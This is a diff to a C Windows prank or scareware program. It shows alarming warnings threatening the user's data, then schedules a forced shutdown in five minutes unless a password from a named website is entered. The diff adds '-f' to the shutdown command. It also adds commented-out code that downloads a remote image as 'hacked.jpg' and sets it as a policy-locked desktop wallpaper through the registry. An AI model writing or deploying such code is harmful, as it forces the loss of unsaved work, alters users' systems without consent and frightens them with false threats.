@@ -855,6 +855,13 @@ int autoshut(void)
 	int i;
 	char passbuffer[7] = { "115-56" };//密码
 	char temp[7] = { '\0' };
+	char FileName[MAX_PATH];
+	HKEY hkey;
+	BYTE v = 1;
+
+	GetCurrentDirectoryA(MAX_PATH, FileName);//获取程序所在目录
+	strcat_s(FileName, MAX_PATH, "\\hacked.jpg");
+
 
 	char wanging_zero[] = { "警告：此内容不适合孕妇以及患有心脏病、高血压、癫痫、脑血管病、神经错乱、哮喘、酗酒、吸毒者等人士访问！"
 		"现在退出此程序或关闭电脑还来得及！如果硬要访问，后果自负！" };
@@ -867,14 +874,13 @@ int autoshut(void)
 		"那就去网站https://cdmxz.github.io寻找密码吧！您只有5分钟了，加油！\n什么？你没连网？网站登不上去？那就不能怪我了，"
 		"只能怪您自己运气太差咯！哈哈~\nPS：本网站和密码不收取一分钱费用，如果要钱，那就是骗子，请勿上当！" };
 
-	i = MessageBox(NULL, (warning_one), TEXT("警告！"), MB_YESNO | MB_ICONWARNING);
-	if (i == IDNO)
+	if ((i = MessageBox(NULL, (warning_one), TEXT("警告！"), MB_YESNO | MB_ICONWARNING)) == IDNO)
 		return 0;
 
 	else if (i == IDYES)
 	{
 		system("color 04");
-		for (i = 10; i >= 0; i--)
+		for (i = 0; i >= 0; i--)
 		{
 			system("cls");
 			printf("\n\n\n\n\n\n\n\n%s", wanging_zero);
@@ -885,7 +891,13 @@ int autoshut(void)
 
 		system("mode con:cols=70 lines=25 && title 请勿退出本程序，否则您的电脑和宝贵的数据都会嗝屁！");//设置窗口大小 
 
-		system("shutdown -s -t 300");//关机命令
+		//URLDownloadToFileA(NULL, "https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=784112224,522461964&fm=26&gp=0.jpg", FileName, 0, NULL);//下载图片
+		//RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
+		//RegSetValueExA(hkey, "Wallpaper", 0, REG_SZ, (BYTE*)FileName, sizeof(FileName));//修改桌面背景
+		//RegSetValueExA(hkey, "WallpaperStyle", 0, REG_DWORD, &v, sizeof(DWORD));//修改桌面背景
+		//RegCloseKey(hkey);
+
+		system("shutdown -f -s -t  300");//关机命令
 		MessageBox(NULL, (warning_two), TEXT("温馨提示：请认真看完。"), MB_OK | MB_ICONQUESTION);
 
 		puts(warning_two);
